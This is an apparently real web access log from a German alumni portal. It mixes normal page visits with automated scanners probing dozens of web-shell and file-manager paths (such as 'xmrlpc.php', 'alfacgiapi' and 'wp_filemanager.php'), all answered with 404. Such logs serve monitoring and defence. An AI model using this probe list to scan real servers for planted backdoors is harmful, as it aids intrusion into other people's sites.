user;timestamp;referer;target;method;status
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:32;;/bless11.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:32;;/wp-admin/js/index.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:33;;/thoms.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:34;;/xsas.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:35;;/xrp.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:36;;/wp-freya.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:37;;/css/index.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:38;;/file30.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:39;;/fesa.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:40;;/class-.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:41;;/up.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:42;;/403.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:42;;/9v6.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:43;;/lte7.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:44;;/1vbqo.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:45;;/l10n.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:46;;/tajj.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:47;;/fdd2.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:47;;/class9.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:48;;/sto.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:49;;/7h.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:50;;/fh26.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:51;;/ixj.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:52;;/x23.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:53;;/zeu.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:53;;/f2r4.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:54;;/lopst.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:55;;/gecko.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:56;;/0xs.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:57;;/Zeiss.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:57;;/x0x.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:58;;/adin.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:40:59;;/wsz.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:41:01;;/ahy66.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:41:02;;/thai.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:41:03;;/dex.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-07 20:41:04;;/zen.php;GET;404
b05d5604e2abcc6c811160372cb7e172093559d5282ecfea8a8a34f68a47cf81;2025-11-07 20:47:48;;/;GET;200
9cea0b15b7ddd00ed0fac5b7d2980d4c21d3001722e2feb0c033d566d52ac981;2025-11-07 20:47:49;;/themen?category=politik;GET;200
b05d5604e2abcc6c811160372cb7e172093559d5282ecfea8a8a34f68a47cf81;2025-11-07 20:50:20;;/sitemap.xml;GET;200
f22611badde89bae024b8b64f6d420c2ace2451fde8d24151bee309fa9edaf36;2025-11-07 20:53:26;/;/;GET;200
8fbeac3b0e490afc4721a6c2d28c1bc7d9c64e9bf40735b114a9cc78e8e179be;2025-11-07 21:00:38;;/admin/config.php;GET;404
08fd9e3724f1a798d527b09f86a1a5979f3765ad623f20b00ed87466e09efb37;2025-11-07 21:04:38;/;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-07 21:16:50;;/actuator/gateway/routes;GET;404
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-07 21:30:05;/personen/alumni/details/josephine-muller;/gruppen/hobby/journalismus;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-07 21:30:06;/personen/alumni/details/josephine-muller;/gruppen;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-07 21:31:27;/gruppen;/gruppen/hobby/gartnern;GET;302
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-07 21:31:28;/gruppen;/gruppen;GET;200
46b3a1a0612d28aad30b093002bac30523f24e0401683963c11384b91063da53;2025-11-07 21:32:42;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
e489cdd8d19f49e90421b194f3dc71899a911ffbeba1963a24c9d2d888e47e5f;2025-11-07 21:34:37;;/;GET;200
55a38f2eb1e7af7da6c19cdbb7c50a198e5a4dc11781e88fe8663646b3bad146;2025-11-07 21:48:41;/;/;GET;200
bd04ee48567713e6fd54bceca3bca295a42ced5414d399bfdf361dfaffc041c5;2025-11-07 21:50:56;/themen/details/bucher-auf-dem-abstellgleis;/themen/details/bucher-auf-dem-abstellgleis;GET;200
0eb39db34bfd1324287ce4e54eff4bcdf7e28b4ba98a6bfe0781b05c767f841e;2025-11-07 21:53:02;;/;GET;200
2a5c4fdd76ac86e05487348d08ac7b81edf90091e36b11bd4a7617eb0b419764;2025-11-07 21:56:36;/;/wp-login.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:11:57;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:11:58;;/qa.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:11:58;;/wp-content/plugins/edaewni/index.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:11:59;;/chosen.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:11:59;;/wxo.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:00;;/wp-admin/includes/xmrlpc.php?p=;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:00;;/wp-includes/fonts/index.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:01;;/wp-includes/images/wp-login.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:01;;/02.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:01;;/abcd.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:02;;/error.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:02;;/yy.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:03;;/.well-known/index.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:03;;/6.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:04;;/class.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:04;;/mail.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:04;;/lv.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:05;;/zwso.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:05;;/filemanager/dialog.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:06;;/r.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:06;;/admin/function.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:06;;/js/fm.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:07;;/buy.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:07;;/s.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:07;;/akcc.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:08;;/qing.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:08;;/w.php?p=;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:08;;/wp-admin/images/singlep.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:09;;/.well-known/pki-validation/alfacgiapi/wawe_gH298.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:09;;/class20.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:10;;/vendor/nikic/php-parser/parser.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:10;;/upload/wp-info.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:10;;/wp-content/themes/about.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:11;;/wp-includes/assets/index.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:12;;/cf.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:12;;/bak.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:13;;/AxAo.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:14;;/worksec.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:15;;/chosen.php?;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:15;;/sx.php;GET;404
15a54815e14c03d9f73a146420ed8eb314a5b2a465f4aa5b27455cd1ed8b0535;2025-11-07 22:12:15;;/minik.php;GET;404
